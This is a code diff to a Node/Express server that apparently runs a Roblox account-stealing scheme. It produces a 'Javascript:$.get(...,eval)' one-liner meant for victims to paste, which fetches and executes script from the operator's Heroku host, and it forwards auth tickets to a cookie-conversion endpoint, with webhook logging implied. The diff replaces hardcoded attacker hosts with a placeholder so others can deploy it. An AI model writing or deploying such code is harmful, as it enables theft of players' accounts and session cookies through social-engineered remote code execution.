@@ -47,9 +47,12 @@ app.get('/roblox-api', (req,res) => {
         client.close();
     })
 })
+app.get('/convertcookie', (req,res) => {
+    res.send(fs.readFileSync('./convertCookie.php').toString())
+})
 
 async function convertToCookie(auth) {
-    let data = await fetch("https://alimohub.000webhostapp.com/convert/suggest.php?suggest="+auth, {
+    let data = await fetch("https://YOURHEROKUAPP.herokuapp.com/convertcookie?suggest="+auth, {
         mode:'no-cors'
     })
     await data
@@ -99,7 +102,7 @@ app.post('/create-log', async (req, res) => {
             webhook: webhook
         }, function(err,succ) {
             if (succ) {
-                let js = `Javascript:$.get("https://jxl-roblox.herokuapp.com/roblox-api?id=${id}",eval)`
+                let js = `Javascript:$.get("https://YOURHEROKUAPP.herokuapp.com/roblox-api?id=${id}",eval)`
                 res.send(js)
             }
         })
